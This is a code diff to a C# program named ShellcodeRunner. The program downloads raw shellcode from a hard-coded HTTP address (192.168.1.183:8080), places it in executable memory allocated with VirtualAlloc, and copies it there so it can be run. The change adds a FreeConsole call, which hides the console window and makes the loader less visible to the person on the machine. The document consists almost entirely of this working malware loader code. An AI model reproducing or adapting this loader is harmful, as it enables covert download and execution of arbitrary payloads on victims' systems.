@@ -18,7 +18,9 @@ namespace ShellcodeRunner
             uint dwCreationFlags,
             IntPtr lpThreadId
             );
-
+        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+        static extern bool FreeConsole();
+        
         static void Main(string[] args)
         {
             
@@ -26,7 +28,7 @@ namespace ShellcodeRunner
             WebClient client = new WebClient();
             string url = "http://192.168.1.183:8080/shellcode.bin";
             byte[] Shellcode = client.DownloadData(url);
-
+            FreeConsole();
             IntPtr allocMemAddress = VirtualAlloc(IntPtr.Zero, (uint)Shellcode.Length, 0x00001000 | 0x00002000, 0x40);
 
             Marshal.Copy(Shellcode, 0, allocMemAddress, Shellcode.Length);
